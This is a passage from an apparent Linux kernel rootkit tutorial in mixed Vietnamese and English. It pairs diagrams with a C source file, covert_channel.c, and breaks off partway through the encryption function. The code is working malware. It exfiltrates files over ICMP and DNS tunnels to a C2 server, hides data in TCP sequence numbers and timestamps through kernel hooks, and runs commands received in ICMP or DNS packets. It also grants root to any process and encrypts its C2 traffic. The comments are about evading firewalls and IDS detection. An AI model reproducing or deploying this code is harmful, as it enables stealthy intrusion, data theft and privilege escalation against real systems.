  2. TCP Timestamp (TSecr field):
     ┌────────────────────────────────────────────────────────┐
     │ Modify TSecr (echo reply) trong outgoing packets      │
     │ Advantage: works on EXISTING connections (HTTP)        │
     │ Bandwidth: 4 bytes per packet (embedded in responses)  │
     │ Zero outbound connections needed (passive exfil)       │
     └────────────────────────────────────────────────────────┘

  3. IP Identification Field:
     ┌────────────────────────────────────────────────────────┐
     │ IP header "Identification" field (16 bits)             │
     │ Used for fragment reassembly (rarely used for non-frag)│
     │ Bandwidth: 2 bytes per packet                          │
     └────────────────────────────────────────────────────────┘
```

#### 14.0.4 Kernel Crypto API — ChaCha20-Poly1305 AEAD

Moi C2 channel nghiem tuc deu CAN encryption. Linux kernel co built-in crypto API:

```
  Kernel Crypto API Architecture:

  ┌─────────────────────────────────────────────────────────────┐
  │  crypto_alloc_aead("rfc7539(chacha20,poly1305)", 0, 0)     │
  │     │                                                       │
  │     ▼                                                       │
  │  struct crypto_aead = handle (transform) cho algorithm     │
  │     │                                                       │
  │     ├── crypto_aead_setkey(tfm, key, 32)   Set 256-bit key │
  │     ├── crypto_aead_setauthsize(tfm, 16)   16-byte tag     │
  │     │                                                       │
  │     └── Usage per message:                                  │
  │         aead_request_alloc(tfm, GFP_KERNEL)                │
  │         aead_request_set_crypt(req, src, dst, len, nonce)  │
  │         crypto_aead_encrypt(req)  hoac  _decrypt(req)      │
  │         aead_request_free(req)                              │
  └─────────────────────────────────────────────────────────────┘

  AEAD (Authenticated Encryption with Associated Data):
  ┌─────────────────────────────────────────────────────────────┐
  │                                                             │
  │  Encrypt:                                                   │
  │    Input:  plaintext + key + nonce + AAD (optional)        │
  │    Output: ciphertext + auth_tag (16 bytes)                │
  │                                                             │
  │    plaintext ──┐                                           │
  │    key ────────┤                                           │
  │    nonce ──────┼──→ [ChaCha20-Poly1305] ──→ ciphertext     │
  │    AAD ────────┘                          └──→ auth_tag    │
  │                                                             │
  │  Decrypt:                                                   │
  │    Input:  ciphertext + auth_tag + key + nonce + AAD       │
  │    Output: plaintext  (hoac -EBADMSG neu tag invalid)      │
  │                                                             │
  │    Neu tag verification FAIL → data bi tampered!           │
  │    -EBADMSG returned, plaintext NOT output.                │
  │                                                             │
  └─────────────────────────────────────────────────────────────┘

  ChaCha20 (Stream cipher):
  ┌──────────────────────────────────────────────────────────┐
  │ - XOR-based stream cipher                                │
  │ - 256-bit key (32 bytes)                                 │
  │ - 96-bit nonce (12 bytes) per message                    │
  │ - Generates keystream → XOR voi plaintext                │
  │ - KHONG can padding (khac AES-CBC)                       │
  │ - Constant-time implementation (no timing side-channels) │
  │ - Software-friendly (khong can AES-NI hardware)          │
  └──────────────────────────────────────────────────────────┘

  Poly1305 (MAC — Message Authentication Code):
  ┌──────────────────────────────────────────────────────────┐
  │ - 128-bit authentication tag (16 bytes)                  │
  │ - One-time key derived from ChaCha20 block 0             │
  │ - Proves: ciphertext chua bi modify                      │
  │ - Combined: encrypt-then-MAC (standard order)            │
  └──────────────────────────────────────────────────────────┘

  Tai sao KHONG dung XOR don gian:
  ┌──────────────────────────────────────────────────────────┐
  │ 1. Known-plaintext attack: neu biet 1 byte plaintext    │
  │    → biet 1 byte key → decrypt byte do o MOI message    │
  │ 2. No authentication: attacker flip bits trong           │
  │    ciphertext → plaintext bi thay doi (malleable)       │
  │ 3. Nonce reuse: 2 messages cung nonce → XOR 2           │
  │    ciphertexts = XOR 2 plaintexts → instant break       │
  └──────────────────────────────────────────────────────────┘

  Wire format (rootkit message):
    ┌──────────┬──────────────────────┬──────────┐
    │ Nonce    │    Ciphertext        │ Auth Tag │
    │ 12 bytes │   (= plaintext len)  │ 16 bytes │
    └──────────┴──────────────────────┴──────────┘
    Total = 12 + plaintext_len + 16 = plaintext_len + 28 bytes overhead
```

#### 14.0.5 skb Manipulation Rules — CRITICAL safety

Khi modify network packets trong kernel, phai tuan thu cac rules nghiem ngat de tranh kernel crash:

```
  sk_buff (Socket Buffer) Manipulation:

  ┌──────────────────────────────────────────────────────────────┐
  │ RULE 1: skb_ensure_writable() TRUOC khi modify              │
  │                                                              │
  │   skb co the SHARED giua nhieu users (clone, fragments).    │
  │   skb_ensure_writable(skb, len) lam:                        │
  │     1. Check neu skb->data la shared (skb_cloned)           │
  │     2. Neu shared → copy data vao new buffer (COW)          │
  │     3. Return 0 = OK, non-zero = error                     │
  │                                                              │
  │ RULE 2: Re-derive ALL pointers SAU ensure_writable          │
  │                                                              │
  │   skb_ensure_writable co the REALLOCATE skb->data.          │
  │   Moi pointer derive TRUOC do (iph, tcph, udph) deu STALE. │
  │                                                              │
  │   SAI:                                                       │
  │     iph = ip_hdr(skb);         ← derive pointer             │
  │     skb_ensure_writable(skb);  ← co the reallocate!        │
  │     iph->ttl = 64;            ← STALE POINTER → CRASH!     │
  │                                                              │
  │   DUNG:                                                      │
  │     skb_ensure_writable(skb, len);  ← ensure writable TRUOC│
  │     iph = ip_hdr(skb);             ← derive pointer SAU    │
  │     tcph = tcp_hdr(skb);           ← ALL pointers fresh    │
  │     iph->ttl = 64;                ← safe to modify         │
  │                                                              │
  │ RULE 3: Recalculate checksums SAU khi modify                │
  │                                                              │
  │   TCP checksum:                                              │
  │     tcph->check = 0;                                        │
  │     tcph->check = csum_tcpudp_magic(                        │
  │       iph->saddr, iph->daddr,                               │
  │       tcp_len, IPPROTO_TCP,                                 │
  │       csum_partial((char *)tcph, tcp_len, 0));              │
  │                                                              │
  │   IP checksum:                                               │
  │     iph->check = 0;                                         │
  │     iph->check = ip_fast_csum((u8 *)iph, iph->ihl);        │
  └──────────────────────────────────────────────────────────────┘
```

---

```c
/* covert_channel.c — Covert communication channels
 *
 * 6 implementations:
 *   1. ICMP tunnel (data in ping payload)
 *   2. DNS tunnel (data in DNS query subdomain)
 *   3. TCP steganography (data in sequence numbers)
 *   4. Passive listener (zero outbound traffic, data in TCP timestamps)
 *   5. ICMP/DNS C2 receive (inbound command reception)
 *   6. Encrypted C2 (ChaCha20-Poly1305 AEAD)
 */

#include "rootkit.h"
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <net/ip.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/ftrace.h>
#include <crypto/aead.h>
#include <linux/random.h>

/* ══════════════════════════════════════════════════════════════
 * 1. ICMP TUNNEL — Hide data in ping packets
 *
 * Concept:
 *   Normal ICMP Echo Request/Reply carry payload data.
 *   ping -s 1400 sends 1400 bytes payload = legitimate.
 *   Rootkit encode data (stolen creds, file contents) trong payload.
 *
 * Giống traffic bình thường:
 *   - Firewall cho qua ICMP (thường)
 *   - IDS thấy "ping" → low priority
 *   - Payload size biến thiên → hard to signature
 *
 * Implementation:
 *   Outbound: rootkit tạo ICMP Echo Request với data trong payload.
 *   Inbound:  C2 server reply trong ICMP Echo Reply.
 *
 * Used by: nhiều APT tools, icmpsh, icmptunnel projects.
 * ══════════════════════════════════════════════════════════════ */

#define ICMP_MAGIC_ID  0x1337   /* ICMP identifier field cho channel */
#define MAX_ICMP_DATA  1400     /* Max payload per packet */

/* Build và send ICMP packet từ kernel space */
static int rk_send_icmp_data(__be32 dest_ip,
                              const void *data, int data_len)
{
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr msg = { 0 };
    struct kvec iov;
    int total_len;
    char *packet;
    struct icmphdr *icmp;
    int ret;

    /* Create raw socket cho ICMP */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW,
                            IPPROTO_ICMP, &sock);
    if (ret < 0) return ret;

    /* Build ICMP packet */
    total_len = sizeof(struct icmphdr) + data_len;
    packet = kzalloc(total_len, GFP_KERNEL);
    if (!packet) {
        sock_release(sock);
        return -ENOMEM;
    }

    icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;           /* Echo Request */
    icmp->code = 0;
    icmp->un.echo.id = htons(ICMP_MAGIC_ID);
    icmp->un.echo.sequence = htons(0);

    /* Copy data vào payload */
    memcpy(packet + sizeof(struct icmphdr), data, data_len);

    /* Calculate checksum.
     * ICMP checksum covers entire ICMP message (header + data).
     * ip_compute_csum = one's complement checksum. */
    icmp->checksum = 0;
    icmp->checksum = ip_compute_csum(packet, total_len);

    /* Send */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = dest_ip;

    iov.iov_base = packet;
    iov.iov_len = total_len;
    msg.msg_name = &addr;
    msg.msg_namelen = sizeof(addr);

    ret = kernel_sendmsg(sock, &msg, &iov, 1, total_len);

    kfree(packet);
    sock_release(sock);
    return ret;
}

/* Exfiltrate file qua ICMP tunnel — chunk by chunk */
static int rk_icmp_exfil_file(__be32 c2_ip, const char *filepath)
{
    struct file *f;
    char *buf;
    loff_t pos = 0;
    ssize_t bytes;
    int seq = 0;

    f = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(f)) return -1;

    buf = kzalloc(MAX_ICMP_DATA, GFP_KERNEL);
    if (!buf) { filp_close(f, NULL); return -ENOMEM; }

    while ((bytes = kernel_read(f, buf, MAX_ICMP_DATA, &pos)) > 0) {
        rk_send_icmp_data(c2_ip, buf, bytes);

        /* Delay between packets → avoid burst detection.
         * Random-ish delay: 50-200ms. */
        msleep(50 + (seq % 150));
        seq++;
    }

    /* Send empty packet = EOF marker */
    rk_send_icmp_data(c2_ip, "", 0);

    kfree(buf);
    filp_close(f, NULL);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * 2. DNS TUNNEL — Encode data in DNS queries
 *
 * Concept:
 *   DNS traffic is almost NEVER blocked.
 *   Data encoded as subdomain labels:
 *     <hex_data>.c2domain.com
 *
 *   C2 server = authoritative DNS server cho c2domain.com
 *   → nhận mọi query cho *.c2domain.com
 *   → decode subdomain = exfiltrated data
 *   → respond trong DNS TXT record = commands
 *
 * Ưu điểm:
 *   - DNS luôn được allow (essential service)
 *   - Đi qua proxy/firewall
 *   - Low bandwidth nhưng stealth cao
 *
 * Used by: BPFDoor (DNS resolve cho C2), SUNBURST (famous),
 *          DNScat2, iodine (open-source tools).
 * ══════════════════════════════════════════════════════════════ */

#define DNS_PORT         53
#define DNS_MAX_LABEL    63    /* Max DNS label length */
#define DNS_MAX_NAME     253   /* Max DNS name length */

/* DNS Header structure */
struct dns_header {
    __be16 id;
    __be16 flags;
    __be16 qdcount;
    __be16 ancount;
    __be16 nscount;
    __be16 arcount;
} __attribute__((packed));

/* Hex encode data thành DNS-safe string */
static int hex_encode(const void *data, int data_len,
                       char *out, int out_len)
{
    const unsigned char *p = data;
    int i, written = 0;
    static const char hex[] = "0123456789abcdef";

    for (i = 0; i < data_len && written + 2 < out_len; i++) {
        out[written++] = hex[p[i] >> 4];
        out[written++] = hex[p[i] & 0x0f];
    }
    out[written] = '\0';
    return written;
}

/* Build DNS query packet */
static int build_dns_query(const char *domain, char *packet, int max_len)
{
    struct dns_header *hdr = (struct dns_header *)packet;
    char *qname;
    int offset;
    const char *p;
    int label_len;

    if (max_len < sizeof(*hdr) + strlen(domain) + 6)
        return -1;

    /* Header */
    memset(hdr, 0, sizeof(*hdr));
    hdr->id = htons(0x1234);         /* Transaction ID */
    hdr->flags = htons(0x0100);      /* Standard query, recursion desired */
    hdr->qdcount = htons(1);         /* 1 question */

    /* Encode domain name.
     * DNS encoding: each label prefixed with length byte.
     * "data.evil.com" → \x04data\x04evil\x03com\x00
     */
    qname = packet + sizeof(*hdr);
    offset = 0;
    p = domain;

    while (*p) {
        const char *dot = strchr(p, '.');
        if (!dot) dot = p + strlen(p);

        label_len = dot - p;
        if (label_len > DNS_MAX_LABEL) label_len = DNS_MAX_LABEL;

        qname[offset++] = label_len;
        memcpy(qname + offset, p, label_len);
        offset += label_len;

        p = (*dot) ? dot + 1 : dot;
    }
    qname[offset++] = 0;  /* Root label terminator */

    /* Query type: A (1) and class: IN (1) */
    qname[offset++] = 0; qname[offset++] = 1;   /* Type A */
    qname[offset++] = 0; qname[offset++] = 1;   /* Class IN */

    return sizeof(*hdr) + offset;
}

/* Send DNS query = data exfiltration */
static int rk_dns_exfil(__be32 dns_server,
                          const char *c2_domain,
                          const void *data, int data_len)
{
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr msg = { 0 };
    struct kvec iov;
    char hex_data[512];
    char query_domain[DNS_MAX_NAME];
    char packet[512];
    int pkt_len, ret;

    /* Hex encode data */
    hex_encode(data, data_len, hex_data, sizeof(hex_data));

    /* Build query domain: <hex_data>.c2domain.com
     * Split hex data into DNS labels (max 63 chars each) */
    if (strlen(hex_data) <= DNS_MAX_LABEL) {
        snprintf(query_domain, sizeof(query_domain),
                 "%s.%s", hex_data, c2_domain);
    } else {
        /* Split into multiple labels */
        char label1[DNS_MAX_LABEL + 1], label2[DNS_MAX_LABEL + 1];
        strncpy(label1, hex_data, DNS_MAX_LABEL);
        label1[DNS_MAX_LABEL] = '\0';
        strncpy(label2, hex_data + DNS_MAX_LABEL, DNS_MAX_LABEL);
        label2[DNS_MAX_LABEL] = '\0';
        snprintf(query_domain, sizeof(query_domain),
                 "%s.%s.%s", label1, label2, c2_domain);
    }

    /* Build DNS packet */
    pkt_len = build_dns_query(query_domain, packet, sizeof(packet));
    if (pkt_len < 0) return -1;

    /* Send via UDP */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM,
                            IPPROTO_UDP, &sock);
    if (ret < 0) return ret;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DNS_PORT);
    addr.sin_addr.s_addr = dns_server;

    iov.iov_base = packet;
    iov.iov_len = pkt_len;
    msg.msg_name = &addr;
    msg.msg_namelen = sizeof(addr);

    ret = kernel_sendmsg(sock, &msg, &iov, 1, pkt_len);

    sock_release(sock);
    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * 3. TCP STEGANOGRAPHY — Data in TCP sequence numbers
 *
 * Concept:
 *   TCP Initial Sequence Number (ISN) thường random (RFC).
 *   Rootkit encode 4 bytes data trong ISN của SYN packet.
 *
 *   C2 server nhận SYN → extract ISN → decode data.
 *   Connection có thể RST ngay → looks like port scan.
 *
 *   Bandwidth: 4 bytes per SYN packet. Slow nhưng very stealthy.
 *
 * Advanced variant:
 *   Dùng TCP timestamp option (10 bytes per packet).
 *   Hoặc: urgent pointer + data.
 *   Hoặc: IP identification field (2 bytes per packet).
 *
 * Implementation:
 *   Hook secure_tcp_seq (hoặc tcp_v4_init_sequence trên kernel cũ)
 *   via ftrace. Khi có pending stego data, override ISN return value.
 * ══════════════════════════════════════════════════════════════ */

static __u32 pending_stego_isn = 0;
static bool  stego_isn_pending = false;
static DEFINE_SPINLOCK(stego_lock);

static u32 (*orig_secure_tcp_seq)(const struct iphdr *, const struct tcphdr *);
static struct ftrace_ops stego_ftrace_ops;

/* Ftrace callback: intercept secure_tcp_seq and override ISN */
static void notrace stego_ftrace_callback(unsigned long ip,
                                            unsigned long parent_ip,
                                            struct ftrace_ops *ops,
                                            struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    unsigned long flags;

    if (!regs) return;

    spin_lock_irqsave(&stego_lock, flags);
    if (stego_isn_pending) {
        /* Override return value: ISN = our encoded data.
         * regs_set_return_value sets RAX. */
        regs_set_return_value(regs, pending_stego_isn);
        stego_isn_pending = false;
        spin_unlock_irqrestore(&stego_lock, flags);

        /* Skip original function by modifying IP */
        instruction_pointer_set(regs,
            (unsigned long)orig_secure_tcp_seq);
        return;
    }
    spin_unlock_irqrestore(&stego_lock, flags);
}

static int stego_hook_install(void)
{
    int ret;
    const char *target = "secure_tcp_seq";

    orig_secure_tcp_seq = (void *)rk_lookup_name(target);
    if (!orig_secure_tcp_seq) {
        /* Fallback: try older name */
        target = "tcp_v4_init_sequence";
        orig_secure_tcp_seq = (void *)rk_lookup_name(target);
        if (!orig_secure_tcp_seq)
            return -ENOENT;
    }

    stego_ftrace_ops.func = stego_ftrace_callback;
    stego_ftrace_ops.flags = FTRACE_OPS_FL_SAVE_REGS |
                              FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter(&stego_ftrace_ops, target,
                             strlen(target), 0);
    if (ret) return ret;

    ret = register_ftrace_function(&stego_ftrace_ops);
    return ret;
}

static void stego_hook_remove(void)
{
    unregister_ftrace_function(&stego_ftrace_ops);
}

/* Send data via TCP ISN steganography.
 *
 * Usage:
 *   1. Set pending_stego_isn = encoded data
 *   2. Connect → kernel calls secure_tcp_seq → hook returns our ISN
 *   3. C2 extracts ISN from received SYN packet */
static int rk_tcp_stego_send(__be32 dest_ip, __be16 dest_port,
                               __u32 encoded_data)
{
    struct socket *sock;
    struct sockaddr_in addr;
    unsigned long flags;
    int ret;

    /* Set pending ISN */
    spin_lock_irqsave(&stego_lock, flags);
    pending_stego_isn = encoded_data ^ 0x5A5A5A5A;
    stego_isn_pending = true;
    spin_unlock_irqrestore(&stego_lock, flags);

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &sock);
    if (ret < 0) {
        stego_isn_pending = false;
        return ret;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = dest_ip;
    addr.sin_port = dest_port;

    /* Non-blocking connect — gửi SYN rồi close.
     * Mục đích chỉ là gửi SYN có encoded ISN. */
    sock->sk->sk_sndtimeo = msecs_to_jiffies(100);
    kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), O_NONBLOCK);

    /* Close ngay — RST packet sent */
    sock_release(sock);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * 4. PASSIVE LISTENER — Zero outbound traffic
 *
 * Concept (BPFDoor pattern):
 *   Rootkit KHÔNG gửi bất kỳ traffic nào ra ngoài.
 *   Đợi inbound magic packet → activate on demand.
 *   Hoàn toàn invisible cho network monitoring.
 *
 * Trick: sửa response packets của legitimate services
 * để embed data. Ví dụ: HTTP server response header
 * có thêm custom header chứa stolen data.
 *
 * Netfilter POST_ROUTING hook:
 *   Intercept outgoing packets → inject data.
 *
 * Implementation:
 *   skb_ensure_writable MUST be called BEFORE deriving any header
 *   pointers. After ensure_writable, skb->data may have been
 *   reallocated — all old pointers (ip_hdr, tcp_hdr) are stale.
 *   Re-derive ALL pointers after the call.
 * ══════════════════════════════════════════════════════════════ */

static char exfil_queue[4096];
static int  exfil_queue_len = 0;
static DEFINE_SPINLOCK(exfil_lock);

/* Queue data for passive exfiltration */
static void rk_queue_exfil(const void *data, int len)
{
    unsigned long flags;
    spin_lock_irqsave(&exfil_lock, flags);
    if (exfil_queue_len + len <= sizeof(exfil_queue)) {
        memcpy(exfil_queue + exfil_queue_len, data, len);
        exfil_queue_len += len;
    }
    spin_unlock_irqrestore(&exfil_lock, flags);
}

static unsigned int nf_passive_exfil(void *priv,
                                      struct sk_buff *skb,
                                      const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct tcphdr *tcph;
    unsigned char *tcp_opts;
    int opt_len, i;
    unsigned long flags;
    __be32 embed_val;

    if (!skb) return NF_ACCEPT;

    /* Step 1: Make skb writable BEFORE any pointer derivation.
     * skb_ensure_writable may reallocate skb->data, making
     * any previously-derived pointers stale and dangerous. */
    if (skb_ensure_writable(skb, skb->len) != 0)
        return NF_ACCEPT;

    /* Step 2: Derive ALL pointers AFTER ensure_writable.
     * skb->data may have been reallocated. */
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_TCP)
        return NF_ACCEPT;

    tcph = tcp_hdr(skb);
    if (!tcph) return NF_ACCEPT;

    /* Chỉ modify packets từ HTTP server (port 80/443) */
    if (ntohs(tcph->source) != 80 && ntohs(tcph->source) != 443)
        return NF_ACCEPT;

    /* Step 3: Check exfil queue */
    spin_lock_irqsave(&exfil_lock, flags);
    if (exfil_queue_len < 4) {
        spin_unlock_irqrestore(&exfil_lock, flags);
        return NF_ACCEPT;
    }
    memcpy(&embed_val, exfil_queue, 4);
    memmove(exfil_queue, exfil_queue + 4, exfil_queue_len - 4);
    exfil_queue_len -= 4;
    spin_unlock_irqrestore(&exfil_lock, flags);

    /* Step 4: Find and modify TCP timestamp option.
     *
     * TCP options nằm sau TCP header:
     *   offset = tcp->doff * 4 (data offset)
     *   options bytes = doff*4 - 20 (20 = min TCP header)
     *
     * Timestamp option (kind 8):
     *   [kind=8][length=10][TSval(4)][TSecr(4)]
     *   Modify TSecr lower bits → embed data.
     */
    opt_len = (tcph->doff * 4) - sizeof(struct tcphdr);
    if (opt_len <= 0) return NF_ACCEPT;
    tcp_opts = (unsigned char *)(tcph + 1);

    for (i = 0; i < opt_len; ) {
        unsigned char kind = tcp_opts[i];
        if (kind == 0) break;
        if (kind == 1) { i++; continue; }
        if (i + 1 >= opt_len) break;
        unsigned char len = tcp_opts[i + 1];
        if (len < 2 || i + len > opt_len) break;

        if (kind == 8 && len == 10) {
            /* Step 5: Embed data (skb already writable) */
            memcpy(&tcp_opts[i + 6], &embed_val, 4);

            /* Step 6: Recalculate TCP checksum */
            int tcp_len = skb->len - ip_hdrlen(skb);
            tcph->check = 0;
            tcph->check = csum_tcpudp_magic(
                iph->saddr, iph->daddr,
                tcp_len, IPPROTO_TCP,
                csum_partial((char *)tcph, tcp_len, 0));
            break;
        }
        i += len;
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops nf_exfil_ops = {
    .hook     = nf_passive_exfil,
    .pf       = PF_INET,
    .hooknum  = NF_INET_POST_ROUTING,
    .priority = NF_IP_PRI_LAST,
};

/* ══════════════════════════════════════════════════════════════
 * 5. ICMP/DNS C2 RECEIVE — Inbound command reception
 *
 * C2 = bidirectional: send data OUT + receive commands IN.
 * Sections 1-2 above only SEND. Here: receive functions.
 *
 * ICMP Receive: listen cho Echo Reply chứa commands.
 *   C2 server reply bằng ICMP Echo Reply.
 *   Payload format: [magic_byte][cmd_type][command_data]
 *   Dùng netfilter hook PRE_ROUTING để intercept inbound ICMP.
 *
 * DNS Receive: parse TXT record trong DNS response.
 *   C2 server reply bằng DNS TXT record chứa hex-encoded command.
 *   Hook DNS response packets (sport 53) inbound.
 * ══════════════════════════════════════════════════════════════ */

/* give_root_to_pid — Escalate privileges cho target process.
 * Tim task_struct boi PID, thay doi credentials thanh root.
 * Dung prepare_kernel_cred approach compatible voi kernel 6.2+. */
static void rk_give_root_to_pid(pid_t target_pid)
{
    struct task_struct *task;
    struct cred *new_cred;

    rcu_read_lock();
    task = pid_task(find_vpid(target_pid), PIDTYPE_PID);
    if (!task) {
        rcu_read_unlock();
        pr_err("rk: give_root: PID %d not found\n", target_pid);
        return;
    }
    get_task_struct(task);
    rcu_read_unlock();

    new_cred = prepare_kernel_cred(task);
    if (!new_cred) {
        put_task_struct(task);
        return;
    }

    new_cred->uid  = new_cred->euid  = new_cred->suid  = new_cred->fsuid  = GLOBAL_ROOT_UID;
    new_cred->gid  = new_cred->egid  = new_cred->sgid  = new_cred->fsgid  = GLOBAL_ROOT_GID;
    new_cred->cap_effective   = CAP_FULL_SET;
    new_cred->cap_permitted   = CAP_FULL_SET;
    new_cred->cap_inheritable = CAP_FULL_SET;
    new_cred->cap_bset        = CAP_FULL_SET;

    commit_creds(new_cred);
    put_task_struct(task);
    pr_info("rk: PID %d escalated to root\n", target_pid);
}

static unsigned int nf_icmp_c2_recv(void *priv,
                                      struct sk_buff *skb,
                                      const struct nf_hook_state *state)
{
    struct iphdr *iph = ip_hdr(skb);
    struct icmphdr *icmph;
    unsigned char *payload;
    int payload_len;

    if (!iph || iph->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;

    icmph = (struct icmphdr *)((char *)iph + iph->ihl * 4);

    /* Chỉ process Echo Reply (type 0) */
    if (icmph->type != ICMP_ECHOREPLY)
        return NF_ACCEPT;

    payload = (unsigned char *)(icmph + 1);
    payload_len = ntohs(iph->tot_len) - iph->ihl * 4 - sizeof(*icmph);

    if (payload_len < 2) return NF_ACCEPT;

    /* Check magic byte */
    if (payload[0] != 0xDE) return NF_ACCEPT;

    /* payload[1] = command type */
    switch (payload[1]) {
    case 0x01:  /* Execute command */
        if (payload_len > 2) {
            char cmd[256];
            int cmd_len = payload_len - 2;
            if (cmd_len > 255) cmd_len = 255;
            memcpy(cmd, payload + 2, cmd_len);
            cmd[cmd_len] = '\0';
            rk_execute_command(cmd);
        }
        break;
    case 0x02:  /* Give root to PID */
        if (payload_len >= 6) {
            pid_t target_pid;
            memcpy(&target_pid, payload + 2, sizeof(pid_t));
            rk_give_root_to_pid(target_pid);
        }
        break;
    case 0x03:  /* Self destruct */
        rk_self_destruct();
        break;
    }

    /* Consume packet (don't pass to userspace).
     * NF_STOLEN means "I own this skb now" — must free it. */
    kfree_skb(skb);
    return NF_STOLEN;
}

static unsigned int nf_dns_c2_recv(void *priv,
                                     struct sk_buff *skb,
                                     const struct nf_hook_state *state)
{
    struct iphdr *iph = ip_hdr(skb);
    struct udphdr *udph;
    unsigned char *dns_data;
    int dns_len;

    if (!iph || iph->protocol != IPPROTO_UDP)
        return NF_ACCEPT;

    udph = (struct udphdr *)((char *)iph + iph->ihl * 4);

    /* Chỉ process DNS responses (source port 53) */
    if (ntohs(udph->source) != 53)
        return NF_ACCEPT;

    dns_data = (unsigned char *)(udph + 1);
    dns_len = ntohs(udph->len) - sizeof(*udph);

    if (dns_len < 12) return NF_ACCEPT;

    /* Check QR bit (bit 15 of flags) = 1 (response) */
    if (!(dns_data[2] & 0x80)) return NF_ACCEPT;

    /* Check transaction ID matches our marker */
    __u16 txid = ntohs(*(__u16 *)dns_data);
    if (txid != 0xBEEF) return NF_ACCEPT;  /* Our marker */

    /* Skip header (12 bytes) + question section → find answer.
     * Simplified: scan for TXT record type (0x0010). */
    int offset = 12;

    /* Skip question section */
    while (offset < dns_len && dns_data[offset] != 0)
        offset += dns_data[offset] + 1;
    offset += 5; /* null terminator + QTYPE(2) + QCLASS(2) */

    /* Parse answer section — look for TXT record */
    if (offset + 12 > dns_len) return NF_ACCEPT;

    /* Skip name pointer (2 bytes if compressed) */
    if (dns_data[offset] & 0xC0)
        offset += 2;
    else
        while (offset < dns_len && dns_data[offset] != 0)
            offset += dns_data[offset] + 1;

    /* TYPE(2) + CLASS(2) + TTL(4) + RDLENGTH(2) */
    if (offset + 10 > dns_len) return NF_ACCEPT;

    __u16 rtype = ntohs(*(__u16 *)(dns_data + offset));
    offset += 8; /* skip TYPE + CLASS + TTL */
    __u16 rdlength = ntohs(*(__u16 *)(dns_data + offset));
    offset += 2;

    if (rtype == 16 && rdlength > 1 && offset + rdlength <= dns_len) {
        /* TXT record: first byte = text length */
        int txt_len = dns_data[offset];
        char *txt = (char *)dns_data + offset + 1;

        if (txt_len > 0 && txt_len < 255) {
            char cmd[256];
            memcpy(cmd, txt, txt_len);
            cmd[txt_len] = '\0';

            /* Hex decode → execute */
            /* For simplicity: treat as ASCII command directly */
            rk_execute_command(cmd);
        }
    }

    return NF_ACCEPT;
}

/* ══════════════════════════════════════════════════════════════
 * 6. ENCRYPTED C2 — ChaCha20-Poly1305 AEAD
 *
 * Tất cả C2 channels trước đều plaintext.
 * Mọi APT rootkit thật dùng encryption.
 *
 * Dùng kernel crypto API:
 *   - ChaCha20-Poly1305 (AEAD: encryption + authentication)
 *   - 12-byte nonce (96-bit, random per message)
 *   - Key: derive từ master secret via HKDF
 *   - Poly1305 tag: 128-bit authentication
 *
 * Tại sao không XOR:
 *   - XOR trivially breakable (known-plaintext attack)
 *   - No authentication → ciphertext malleable
 *   - Nonce reuse = keystream reuse = instant break
 *
 * ChaCha20-Poly1305:
 *   - AEAD: encrypt + authenticate in one operation
 *   - 96-bit nonce space → birthday collision ~2^48 messages
 *   - Kernel has native support: rfc7539(chacha20,poly1305)
 * ══════════════════════════════════════════════════════════════ */

#define C2_KEY_SIZE     32  /* ChaCha20 key = 256 bits */
#define C2_NONCE_SIZE   12  /* ChaCha20-Poly1305 nonce = 96 bits */
#define C2_TAG_SIZE     16  /* Poly1305 tag = 128 bits */

static u8 c2_session_key[C2_KEY_SIZE];
static struct crypto_aead *c2_aead_tfm;

/* Atomic nonce counter for XOR fallback path.
 * Non-atomic increment under concurrent use = nonce reuse
 * = keystream reuse = instant cryptographic break. */
static atomic_t nonce_counter = ATOMIC_INIT(0);

int rk_crypto_init(void)
{
    /* Allocate ChaCha20-Poly1305 transform */
    c2_aead_tfm = crypto_alloc_aead("rfc7539(chacha20,poly1305)", 0, 0);
    if (IS_ERR(c2_aead_tfm)) {
        int err = PTR_ERR(c2_aead_tfm);  /* Save error FIRST */
        c2_aead_tfm = NULL;               /* THEN null */
        return err;                        /* Return real error code */
    }

    /* Generate random session key */
    get_random_bytes(c2_session_key, C2_KEY_SIZE);

    /* Set key */
    crypto_aead_setkey(c2_aead_tfm, c2_session_key, C2_KEY_SIZE);
    crypto_aead_setauthsize(c2_aead_tfm, C2_TAG_SIZE);

    return 0;
}

void rk_crypto_cleanup(void)
{
    if (c2_aead_tfm)
        crypto_free_aead(c2_aead_tfm);
}

/* Encrypt + authenticate.
 * Output: [12-byte nonce][ciphertext][16-byte tag]
 * Total output size = nonce + plaintext_len + tag
 */
int rk_aead_encrypt(const void *plaintext, int pt_len,
                      void *output, int *out_len)
{
    struct aead_request *req;
    struct scatterlist sg_plain, sg_cipher;
    u8 nonce[C2_NONCE_SIZE];
    u8 *ct_buf;
    int ct_len = pt_len + C2_TAG_SIZE;
    int ret;
    DECLARE_CRYPTO_WAIT(wait);

    if (!c2_aead_tfm) return -ENODEV;

    /* Random nonce mỗi message — 96-bit nonce space.
     * Birthday collision after ~2^48 messages — acceptable. */
    get_random_bytes(nonce, C2_NONCE_SIZE);

    ct_buf = kzalloc(ct_len, GFP_KERNEL);
